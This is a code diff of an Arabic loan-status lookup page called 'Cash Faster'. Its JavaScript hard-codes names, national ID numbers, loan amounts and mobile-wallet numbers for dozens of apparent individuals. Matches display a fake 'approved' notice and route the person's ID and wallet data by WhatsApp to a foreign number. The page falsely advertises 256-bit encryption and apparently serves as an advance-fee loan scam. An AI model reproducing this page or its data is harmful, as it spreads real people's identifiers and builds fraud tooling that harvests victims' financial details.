@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Cash Faster | استعلام عن حالة طلب التمويل</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -10,172 +10,217 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Segoe UI', 'Tajawal', 'Cairo', system-ui, sans-serif;
         }
 
         body {
-            background-color: #000000;
-            color: #ffffff;
+            background: radial-gradient(circle at 10% 20%, #0a0a0a, #000000);
+            color: #fff;
             min-height: 100vh;
-            line-height: 1.6;
+            position: relative;
             overflow-x: hidden;
         }
 
-        .container {
+        /* خلفية نارية متحركة */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 20px;
+            height: 100%;
+            background: radial-gradient(circle at 50% 0%, rgba(212, 175, 55, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
         }
 
-        /* ===== HEADER مع شعار ناري متحرك ===== */
-        .header {
+        /* جزيئات ذهبية */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            background: radial-gradient(circle, #FFD966, #D4AF37);
+            border-radius: 50%;
+            opacity: 0.4;
+            animation: floatParticle 12s infinite ease-in-out;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(0) rotate(0deg); opacity: 0.2; }
+            50% { transform: translateY(-30px) rotate(180deg); opacity: 0.6; }
+            100% { transform: translateY(0) rotate(360deg); opacity: 0.2; }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* رأس الموقع */
+        .hero {
             text-align: center;
-            padding: 40px 20px 30px;
-            border-bottom: 3px solid #D4AF37;
-            margin-bottom: 40px;
-            background: linear-gradient(180deg, #0a0a0a 0%, #000000 100%);
+            padding: 50px 20px 30px;
+            margin-bottom: 20px;
         }
 
         .logo {
-            position: relative;
             display: inline-block;
+            position: relative;
         }
 
         .logo h1 {
             font-size: 4rem;
             font-weight: 900;
-            background: linear-gradient(45deg, #D4AF37, #FFD700, #D4AF37);
+            background: linear-gradient(135deg, #D4AF37, #FFD966, #FFA500);
             -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 5px;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
+            letter-spacing: 4px;
             margin: 0;
-            animation: flame 1.8s infinite alternate;
-            filter: drop-shadow(0 0 20px #D4AF37);
+            animation: flameText 2s infinite alternate;
         }
 
-        @keyframes flame {
-            0% { text-shadow: 0 0 10px #D4AF37, 0 0 20px #D4AF37, 0 0 30px #FFD700; opacity: 0.9; }
-            50% { text-shadow: 0 0 15px #FFD700, 0 0 25px #FF8C00, 0 0 40px #FF4500; opacity: 1; }
-            100% { text-shadow: 0 0 20px #D4AF37, 0 0 40px #FFD700, 0 0 60px #FF8C00; opacity: 0.9; }
+        @keyframes flameText {
+            0% { text-shadow: 0 0 10px #D4AF37, 0 0 20px #D4AF37; }
+            100% { text-shadow: 0 0 20px #FFD700, 0 0 40px #FF8C00; }
         }
 
         .logo-sub {
-            color: #39FF14;
             font-size: 1.2rem;
-            font-weight: 600;
+            font-weight: 500;
+            background: linear-gradient(90deg, #39FF14, #D4AF37);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
             letter-spacing: 2px;
-            text-shadow: 0 0 10px #39FF14, 0 0 20px #39FF14;
-            margin-top: 5px;
+            margin-top: 8px;
         }
 
-        /* ===== بطاقة البحث ===== */
+        /* بطاقة البحث */
         .search-card {
-            background: #121212;
-            border: 1px solid #333;
-            border-radius: 30px;
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .search-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, #D4AF37, #39FF14, #D4AF37);
+            background: rgba(10, 10, 15, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(212, 175, 55, 0.4);
+            border-radius: 48px;
+            padding: 40px 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 20px rgba(212,175,55,0.1);
+            transition: all 0.3s;
         }
 
         .search-title {
-            color: #D4AF37;
-            font-size: 2rem;
-            margin-bottom: 15px;
-            text-align: center;
+            font-size: 2.2rem;
             font-weight: 700;
+            text-align: center;
+            color: #D4AF37;
+            margin-bottom: 15px;
+        }
+
+        .search-title i {
+            margin-left: 12px;
+            filter: drop-shadow(0 0 5px #D4AF37);
         }
 
         .search-description {
             text-align: center;
-            color: #888;
-            margin-bottom: 30px;
+            color: #aaa;
+            margin-bottom: 35px;
             font-size: 1.1rem;
         }
 
-        .search-group {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            max-width: 600px;
+        .input-group {
+            max-width: 550px;
             margin: 0 auto;
+            position: relative;
         }
 
-        .search-group input {
-            padding: 20px;
-            border-radius: 60px;
+        .input-group input {
+            width: 100%;
+            padding: 20px 25px;
+            background: #0c0c0f;
             border: 2px solid #333;
-            background: #000;
+            border-radius: 80px;
+            font-size: 1.2rem;
             color: #39FF14;
-            font-size: 1.3rem;
             text-align: center;
+            letter-spacing: 2px;
+            transition: all 0.3s;
             outline: none;
-            transition: all 0.3s ease;
+            font-family: monospace;
+            font-weight: 600;
         }
 
-        .search-group input:focus {
+        .input-group input:focus {
             border-color: #D4AF37;
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+            box-shadow: 0 0 20px rgba(212,175,55,0.5);
+            background: #000;
         }
 
         .btn-search {
-            background: linear-gradient(45deg, #996515, #D4AF37);
-            color: #000;
-            border: none;
-            padding: 18px 30px;
-            border-radius: 60px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
+            width: 100%;
+            max-width: 320px;
+            margin: 30px auto 0;
+            background: linear-gradient(95deg, #D4AF37, #FFD966);
+            border: none;
+            padding: 16px 20px;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #000;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 20px rgba(212,175,55,0.3);
         }
 
         .btn-search:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 30px #D4AF37;
+            box-shadow: 0 12px 30px rgba(212,175,55,0.6);
+            background: linear-gradient(95deg, #FFD966, #D4AF37);
         }
 
-        /* ===== نتيجة الاستعلام ===== */
+        /* بطاقة النتيجة */
         .result-card {
-            background: #121212;
+            background: rgba(10, 12, 18, 0.9);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
             border: 1px solid #D4AF37;
-            border-radius: 40px;
-            padding: 40px;
+            padding: 40px 35px;
             margin-top: 30px;
-            box-shadow: 0 20px 50px rgba(212, 175, 55, 0.2);
-            animation: fadeIn 0.6s ease-out;
             display: none;
+            animation: slideUpFade 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideUpFade {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .congrats {
             text-align: center;
             margin-bottom: 30px;
-            padding: 20px;
+            padding: 15px;
             background: rgba(57, 255, 20, 0.05);
             border-radius: 60px;
             border: 1px dashed #39FF14;
@@ -183,29 +228,27 @@
 
         .congrats h2 {
             color: #39FF14;
-            font-size: 2.5rem;
-            font-weight: 900;
-            text-shadow: 0 0 20px #39FF14;
-            margin-bottom: 10px;
+            font-size: 2.2rem;
+            font-weight: 800;
+            text-shadow: 0 0 15px #39FF14;
         }
 
         .congrats p {
             color: #D4AF37;
-            font-size: 1.3rem;
+            font-size: 1.2rem;
         }
 
         .data-table {
             width: 100%;
             border-collapse: collapse;
-            margin: 30px 0;
-            background: #0a0a0a;
-            border-radius: 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 32px;
             overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.7);
+            margin: 35px 0;
         }
 
         .data-table tr {
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid rgba(212,175,55,0.2);
         }
 
         .data-table tr:last-child {
@@ -214,211 +257,267 @@
 
         .data-table td {
             padding: 18px 25px;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
         }
 
         .data-table td:first-child {
+            font-weight: 700;
             color: #D4AF37;
-            font-weight: 600;
+            background: rgba(0,0,0,0.4);
             width: 40%;
-            background: #111;
         }
 
         .data-table td:last-child {
             color: #fff;
+            background: rgba(20,20,30,0.6);
             font-weight: 500;
-            background: #1a1a1a;
         }
 
         .highlight {
             color: #39FF14 !important;
-            text-shadow: 0 0 5px #39FF14;
-            font-weight: bold;
+            text-shadow: 0 0 3px #39FF14;
+            font-weight: 700;
         }
 
         .whatsapp-button {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
+            gap: 12px;
             background: #25D366;
             color: white;
             text-decoration: none;
-            padding: 20px 30px;
-            border-radius: 80px;
-            font-size: 1.5rem;
+            padding: 18px 28px;
+            border-radius: 60px;
+            font-size: 1.3rem;
             font-weight: bold;
-            margin: 30px 0 20px;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(37, 211, 102, 0.4);
-            border: 2px solid #D4AF37;
+            margin: 30px 0 15px;
+            transition: 0.3s;
+            border: 1px solid #D4AF37;
+            box-shadow: 0 8px 20px rgba(37,211,102,0.3);
         }
 
         .whatsapp-button:hover {
             transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(37, 211, 102, 0.6);
-            background: #20ba5a;
+            background: #20b85a;
+            box-shadow: 0 15px 30px rgba(37,211,102,0.5);
         }
 
         .whatsapp-button i {
-            font-size: 2rem;
+            font-size: 1.8rem;
         }
 
+        .note {
+            text-align: center;
+            color: #777;
+            font-size: 0.85rem;
+        }
+
+        /* خطأ */
         .error-card {
-            background: #121212;
-            border: 2px solid #dc143c;
-            border-radius: 30px;
-            padding: 30px;
+            background: rgba(220,20,60,0.15);
+            backdrop-filter: blur(10px);
+            border: 1px solid #dc143c;
+            border-radius: 48px;
+            padding: 40px;
             text-align: center;
             margin-top: 30px;
             display: none;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
         }
 
         .error-card p {
-            color: #dc143c;
+            color: #ff6b6b;
             font-size: 1.3rem;
             font-weight: 600;
         }
 
-        .footer {
-            text-align: center;
-            padding: 40px 20px;
-            color: #444;
-            font-size: 0.9rem;
-            border-top: 1px solid #222;
-            margin-top: 40px;
+        .error-card i {
+            font-size: 2rem;
+            margin-bottom: 15px;
         }
 
-        /* ===== تجهيز للجوال ===== */
-        @media (max-width: 600px) {
-            .logo h1 { font-size: 2.5rem; }
-            .search-title { font-size: 1.6rem; }
-            .data-table td { padding: 12px 15px; font-size: 1rem; }
-            .whatsapp-button { font-size: 1.2rem; padding: 15px 20px; }
+        /* تذييل */
+        .footer {
+            text-align: center;
+            padding: 35px 20px;
+            color: #555;
+            border-top: 1px solid #222;
+            margin-top: 60px;
+            font-size: 0.85rem;
+        }
+
+        /* توافق الجوال */
+        @media (max-width: 680px) {
+            .logo h1 { font-size: 2.6rem; letter-spacing: 2px; }
+            .search-title { font-size: 1.7rem; }
+            .search-card { padding: 30px 20px; }
+            .data-table td { padding: 12px 15px; font-size: 0.9rem; }
+            .whatsapp-button { font-size: 1rem; padding: 14px 20px; }
+            .congrats h2 { font-size: 1.7rem; }
+        }
+
+        .glow-text {
+            color: #D4AF37;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="logo">
-        <h1>CASH FASTER</h1>
-        <div class="logo-sub">التمويل الذكي - الربط الفوري</div>
-    </div>
-</div>
+<!-- جزيئات متحركة -->
+<div class="particles" id="particles"></div>
 
 <div class="container">
-    <!-- بطاقة البحث -->
-    <div class="search-card">
-        <h2 class="search-title"><i class="fas fa-search" style="color: #D4AF37;"></i> استعلم عن حالة طلبك</h2>
-        <p class="search-description">أدخل رقمك القومي (14 رقم) لمعرفة حالة الطلب والبيانات المسجلة</p>
-        <div class="search-group">
-            <input type="text" id="nationalId" placeholder="مثال: 29911060100936" maxlength="14">
-            <button class="btn-search" onclick="searchRequest()"><i class="fas fa-shield-alt"></i> استعلام <i class="fas fa-arrow-left"></i></button>
+    <div class="hero">
+        <div class="logo">
+            <h1>CASH FASTER</h1>
+            <div class="logo-sub">التمويل الذكي - الربط الفوري</div>
         </div>
     </div>
 
-    <!-- نتيجة الاستعلام (تظهر عند النجاح) -->
+    <!-- بطاقة البحث -->
+    <div class="search-card">
+        <div class="search-title">
+            <i class="fas fa-search"></i> استعلم عن حالة طلبك
+        </div>
+        <p class="search-description">
+            أدخل رقمك القومي (14 رقم) لمعرفة حالة التمويل والبيانات المسجلة
+        </p>
+        <div class="input-group">
+            <input type="text" id="nationalId" placeholder="مثال: 29101080300051" maxlength="14" inputmode="numeric">
+        </div>
+        <button class="btn-search" onclick="searchRequest()">
+            <i class="fas fa-shield-alt"></i> استعلام فوري <i class="fas fa-arrow-left"></i>
+        </button>
+    </div>
+
+    <!-- منطقة النتيجة -->
     <div id="resultSection" class="result-card">
         <div class="congrats">
             <h2><i class="fas fa-check-circle"></i> تهانينا! تمت الموافقة</h2>
             <p>طلب التمويل الخاص بك معتمد وجاهز للربط</p>
         </div>
-
         <table class="data-table" id="dataTable">
-            <!-- يتم ملء البيانات عبر JS -->
-        </table>
-
-        <!-- زر واتساب للتواصل مع التحويلات -->
+            <!-- البيانات ستضاف عبر js -->
+         </table>
         <a href="#" id="whatsappLink" class="whatsapp-button" target="_blank">
-            <i class="fab fa-whatsapp"></i> تواصل الآن مع التحويلات المالية
+            <i class="fab fa-whatsapp"></i> تواصل الآن مع فريق التحويلات
         </a>
-        <p style="color:#888; text-align:center; font-size:0.9rem;">سيتم تحويلك إلى واتساب مع رسالة جاهزة تتضمن بياناتك</p>
+        <div class="note">سيتم تحويلك إلى واتساب برسالة جاهزة تحتوي بياناتك لتسريع الإجراءات</div>
     </div>
 
-    <!-- رسالة خطأ -->
+    <!-- رسالة الخطأ -->
     <div id="errorSection" class="error-card">
-        <p><i class="fas fa-exclamation-triangle"></i> الرقم القومي غير مسجل في النظام. يرجى التأكد من الرقم أو التواصل مع الدعم.</p>
+        <i class="fas fa-exclamation-triangle"></i>
+        <p>الرقم القومي غير مسجل في النظام. يرجى التأكد من الرقم أو التواصل مع الدعم.</p>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2026 Cash Faster للتمويل والربط الفوري. جميع الحقوق محفوظة.</p>
+        <p>نظام آمن ومشفر 256-bit وفق أعلى المعايير</p>
     </div>
 </div>
 
-<footer class="footer">
-    <p>&copy; 2026 Cash Faster للتمويل والربط الفوري. جميع الحقوق محفوظة.</p>
-    <p>نظام آمن ومشفر 128 بت</p>
-</footer>
-
 <script>
-    // قاعدة البيانات الكاملة للعملاء (دمج جميع العملاء القدامى والجدد من ملف Excel)
+    // ========== العملاء الجدد فقط (تم حذف جميع العملاء القدامى) ==========
+    // بناءً على ملف Excel المرفق والتعديلات الأخيرة (أحمد منصور بدون محفظة)
     const customersDatabase = {
-        // العملاء القدامى (14 عميل)
-        "30001122101372": { name: "محمود عزت الحسيني محمد", loan: "45,000 ج.م", wallet: "اتصالات كاش", walletNum: "01112403412", payment: "من يوم 6 إلى يوم 10" },
-        "29406011407931": { name: "محمد حسين محمد الحلو", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01030912966", payment: "من يوم 26 إلى يوم 31" },
-        "26611022200531": { name: "عاطف علام عبد الحميد سلطان", loan: "125,000 ج.م", wallet: "لايوجد", walletNum: "", payment: "من يوم 26 إلى يوم 31" },
-        "29311171601597": { name: "محمد فوزى محمد حافظ المالكى", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01093815126", payment: "من يوم 6 إلى يوم 10" },
-        "27303282400337": { name: "فتحي علي عبد المطلب علي ", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01094990365", payment: "من يوم 6 إلى يوم 10" },
-        "29311020101088": { name: "ايه محمد طه عبد اللطيف", loan: "50,000 ج.م", wallet: "لا يوجد", walletNum: "01110207317", payment: "من يوم 6 إلى يوم 10" },
-        "29503132502456": { name: "حسام شحاته محمد سلامه ", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01015095529", payment: "من يوم 16 إلى يوم 20" },
-        "29301201303965": { name: "ياسمين ربيع السيد حسن", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01102775399", payment: "من يوم 26 إلى يوم 31" },
-        "27001010109963": { name: "صفاء محمد علي محمد شرف", loan: "80,000 ج.م", wallet: "اتصالات كاش", walletNum: "01113067366", payment: "من يوم 1 إلى يوم 5" },
-        "29601058800654": { name: "محمد إبراهيم مصطفى السعيد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01006601497", payment: "من يوم 26 إلى يوم 31" },
-        "28807291600472": { name: "رجب عبدالحميد رجب الفرس", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01021322959", payment: "من يوم 1 إلى يوم 5" },
-        "28902161700478": { name: "محمد حلمي عبدالعظيم إبراهيم", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "0101208421", payment: "من يوم 11 إلى 15" },
-        "28912072103259": { name: "نبيل أبوبكر توفيق عفيفي", loan: "60,000 ج.م", wallet: "اتصالات كاش", walletNum: "01118381240", payment: "من يوم 16 إلى يوم 20" },
-        "27608190101169": { name: "مروه فتح الباب عبدون السيد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01023184049", payment: "من يوم 6 إلى يوم 10" },
-
-        // العملاء الجدد من ملف Excel (33 عميل)
-        "27305031077": { name: "معتمد محى الدين محمد حسن عبداللطيف", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01559333140", payment: "من يوم 26 إلى يوم 31" },
-        "28103072702149": { name: "سهير علي محمد خليل ", loan: "75,000 ج.م", wallet: "لايوجد", walletNum: ".", payment: "من يوم 1 إلى يوم 5" },
-        "293041300213": { name: "محمد سيداحمد غريب ابراهيم  ", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01030199063", payment: "من يوم 16 إلى يوم 20" },
-        "2950400091": { name: "اشرف عامر محمد عامر", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01070689354", payment: "من يوم 6 إلى يوم 10" },
-        "28107601539": { name: "ناصر عبد القادر محمد احمد", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01157571645", payment: "من يوم 1 إلى يوم 5" },
-        "2970201905": { name: "فاتن على فرج احمد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01090254580", payment: "من يوم 26 إلى يوم 31" },
-        "2720720112": { name: "ياسر محمد سنوسى عبدالعال", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01118832110", payment: "من يوم 26 إلى يوم 31" },
-        "3000102079": { name: "محمد منصور عبدالعظيم محمد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01006008964", payment: "من يوم 1 إلى يوم 5" },
-        "27609150105044": { name: "مروة فؤاد عثمان اسماعيل", loan: "150,000 ج.م", wallet: "فودافون كاش", walletNum: "01028761278", payment: "من يوم 6 إلى يوم 10" },
-        "27902011403391": { name: "سمير عبد الخالق شحات إبراهيم", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01144019215", payment: "من يوم 6 إلى يوم 10" },
-        "29911000936": { name: "احمد محمد احمد حسين", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01055980976", payment: "من يوم 11 إلى 15" },
-        "28110011315": { name: "هانى محمد احمد باتع", loan: "60,000 ج.م", wallet: "فودافون كاش", walletNum: "01040366124", payment: "من يوم 6 إلى يوم 10" },
-        "2840090200498": { name: "عمرو حسين محمد عيد", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01271044670", payment: "من يوم 16 إلى يوم 20" },
-        "2891200103758": { name: "محمد على محمد محمد", loan: "150,000 ج.م", wallet: "اتصالات كاش", walletNum: "01156436711", payment: "من يوم 21 إلى يوم 25" },
-        "270051400856": { name: "محمد إبراهيم عفيفي حسين", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01288535470", payment: "من يوم 11 إلى 15" },
-        "289061402156": { name: "اسلام جمال احمد فرج", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01104364196", payment: "من يوم 11 إلى 15" },
-        "304071800032": { name: "مصطفى عبد الرحمن جابر منصور", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01112761171", payment: "من يوم 26 إلى يوم 31" },
-        "268052301193": { name: "محمداحمدمحمدرمضان ربيع", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01094322480", payment: "من يوم 26 إلى يوم 31" },
-        "275061800731": { name: "عمر عبد الحليم عبد المجيد عوض", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01002013466", payment: "من يوم 11 إلى 15" },
-        "283082602379": { name: "بهاء الدين محمد فرغل عبد العزيز", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01126981028", payment: "من يوم 16 إلى يوم 20" },
-        "30711105142": { name: "جهاد حشمت البكري محمد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01025146560", payment: "من يوم 16 إلى يوم 20" },
-        "272112600971": { name: "اشرف عبد الرحيم قناوي عبدالرحيم", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01098206813", payment: "من يوم 26 إلى يوم 31" },
-        "288070200589": { name: "بسنت رمضان ياقوت احمد ", loan: "160,000 ج.م", wallet: "لايوجد", walletNum: "01226326353", payment: "من يوم 1 إلى يوم 5" },
-        "289070200731": { name: "محمد احمد عبدالله عبدالقادر", loan: "50,000 ج.م", wallet: "لا يوجد", walletNum: "01283498080", payment: "من يوم 26 إلى يوم 31" },
-        "282041804957": { name: "على جابر على حسن", loan: "80,000 ج.م", wallet: "فودافون كاش", walletNum: "01097281766", payment: "من يوم 26 إلى يوم 31" },
-        "292041200652": { name: "محمد حامد عبد العزيز السيد", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01015565111", payment: "من يوم 1 إلى يوم 5" },
-        "286021601291": { name: "عصام فاروق الششتاوي الدالي", loan: "70,000 ج.م", wallet: "لايوجد", walletNum: "01201967872", payment: "من يوم 16 إلى يوم 20" },
-        "285090200914": { name: "حازم حسن ابراهيم محمد", loan: "155,000 ج.م", wallet: "لايوجد", walletNum: "01278051478", payment: "من يوم 16 إلى يوم 20" },
-        "2950841400091": { name: "اشرف عامر محمد عامر", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01070689354", payment: "من يوم 26 إلى يوم 31" },
-
-        // ===== العملاء الجدد من استمارة تسجيل شهر٣ (8 عملاء) =====
-        "28512121803379": { name: "محمد مسعد عبدالقادر قاسم", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01027475098", payment: "من يوم 1 إلى يوم 5" },
-        "27303282400337": { name: "فتحي علي عبد المطلب علي", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01094990365", payment: "من يوم 1 إلى يوم 5" },
-        "28103022300236": { name: "سيد سليمان ابراهيم علي", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01000508569", payment: "من يوم 1 إلى يوم 5" },
-        "27001101805211": { name: "علاء احمد محمد الحلواني", loan: "60,000 ج.م", wallet: "لايوجد", walletNum: "لا يوجد", payment: "من يوم 1 إلى يوم 5" },
-        "28012062601918": { name: "منتصر فوزى مصطفى سليمان", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01023027214", payment: "من يوم 1 إلى يوم 5" },
-        "29503132502456": { name: "حسام شحاته محمد سلامه", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01015095529", payment: "من يوم 1 إلى يوم 5" },
-        "29601058800654": { name: "محمد إبراهيم مصطفى السعيد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01006601497", payment: "من يوم 1 إلى يوم 5" },
-        "287102513012": { name: "ابراهيم محمد صبري محمد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01000124702", payment: "من يوم 1 إلى يوم 5" }
+        // أحمد منصور (بدون محفظة)
+        "29101080300051": {
+            name: "أحمد منصور إبراهيم عبداللاه",
+            loan: "200,000 ج.م",
+            wallet: "لا توجد محفظة مسجلة",
+            walletNum: "غير مسجل",
+            payment: "حسب العقد"
+        },
+        // باقي العملاء من Excel (لديهم محافظ)
+        "29512300300189": {
+            name: "مروه عصام محمد مهران",
+            loan: "200,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01200020138",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "28209292700476": {
+            name: "حسانى عياد بدرى السنوسي",
+            loan: "40,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01004580991",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29408012104373": {
+            name: "أحمد محمد عباس اسماعيل",
+            loan: "105,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01080396742",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "27903222600113": {
+            name: "وائل محمود عباس هريدي",
+            loan: "50,000 ج.م",
+            wallet: "اتصالات كاش",
+            walletNum: "01150597173",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29101011533558": {
+            name: "محمد خيرى احمد جميز",
+            loan: "35,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01005739087",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29003090102514": {
+            name: "محمود احمد احمد ابراهيم",
+            loan: "45,000 ج.م",
+            wallet: "اتصالات كاش",
+            walletNum: "01102416547",
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29611042102189": {
+            name: "هاجر سعيد سيد إبراهيم",
+            loan: "35,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01080881951",
+            payment: "من يوم 1 إلى يوم 5"
+        }
     };
 
-    // دالة البحث الرئيسية
+    // توليد جزيئات عشوائية
+    function createParticles() {
+        const particlesDiv = document.getElementById('particles');
+        const particleCount = 40;
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 8 + 3;
+            particle.style.width = `${size}px`;
+            particle.style.height = `${size}px`;
+            particle.style.left = `${Math.random() * 100}%`;
+            particle.style.top = `${Math.random() * 100}%`;
+            particle.style.animationDuration = `${Math.random() * 12 + 8}s`;
+            particle.style.animationDelay = `${Math.random() * 5}s`;
+            particlesDiv.appendChild(particle);
+        }
+    }
+    createParticles();
+
+    // دالة البحث
     function searchRequest() {
         const nationalId = document.getElementById('nationalId').value.trim();
-        const resultSection = document.getElementById('resultSection');
-        const errorSection = document.getElementById('errorSection');
+        const resultDiv = document.getElementById('resultSection');
+        const errorDiv = document.getElementById('errorSection');
         const dataTable = document.getElementById('dataTable');
         const whatsappLink = document.getElementById('whatsappLink');
 
-        // إخفاء الأقسام في كل مرة
-        resultSection.style.display = 'none';
-        errorSection.style.display = 'none';
+        resultDiv.style.display = 'none';
+        errorDiv.style.display = 'none';
 
         if (!nationalId) {
             alert('يرجى إدخال الرقم القومي');
@@ -426,38 +525,34 @@
         }
 
         const customer = customersDatabase[nationalId];
-
         if (customer) {
-            // إنشاء صفوف الجدول
-            let tableRows = `
+            // بناء الجدول
+            let rows = `
                 <tr><td>الاسم الرباعي</td><td>${customer.name}</td></tr>
                 <tr><td>مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td></tr>
                 <tr><td>نوع المحفظة</td><td>${customer.wallet}</td></tr>
                 <tr><td>رقم المحفظة</td><td>${customer.walletNum}</td></tr>
                 <tr><td>موعد السداد الشهري</td><td>${customer.payment}</td></tr>
             `;
-            dataTable.innerHTML = tableRows;
+            dataTable.innerHTML = rows;
 
-            // إنشاء رسالة واتساب ذكية
+            // إنشاء رسالة واتساب
             const message = `السلام عليكم، أنا ${customer.name} (الرقم القومي: ${nationalId})، أود إتمام إجراءات ربط حسابي بالسيستم للحصول على تمويل بقيمة ${customer.loan}. بيانات محفظتي: ${customer.wallet} رقم ${customer.walletNum}. أريد إنهاء الربط الآن.`;
-            const encodedMessage = encodeURIComponent(message);
-            const whatsappUrl = `https://wa.me/212614494251?text=${encodedMessage}`;
-            whatsappLink.href = whatsappUrl;
+            const encoded = encodeURIComponent(message);
+            whatsappLink.href = `https://wa.me/212614494251?text=${encoded}`;
 
-            // عرض القسم
-            resultSection.style.display = 'block';
+            resultDiv.style.display = 'block';
